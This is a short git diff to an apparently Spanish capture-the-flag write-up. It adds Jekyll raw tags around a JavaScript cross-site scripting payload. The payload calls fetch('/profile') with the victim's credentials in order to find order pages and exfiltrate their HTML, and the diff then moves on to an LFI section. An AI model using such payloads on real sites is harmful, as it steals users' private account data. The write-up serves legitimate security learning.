@@ -326,6 +326,7 @@ En mi caso yo al ir a ese enlace que me redirige a `/order/<id>`, no veo mucho.
 
 Por lo que cree una regex que de la respuesta de `/profile`, filtre por el endpoint `/order/<id>`, para luego exfiltrar el código HTML que tienen estos usuarios al ingresa a x orden.
 
+{% raw %}
 ```javascript
 fetch('/profile', {credentials: "include"})
 .then((resp) => resp.text())
@@ -344,6 +345,7 @@ fetch('/profile', {credentials: "include"})
   };
 });
 ```
+{% endraw %}
 ### LFI
 
 Volví a ejecutar el script nuevamente, y veo que los usuarios tienen un enlace el cual les permite descargar el libro de la compra.
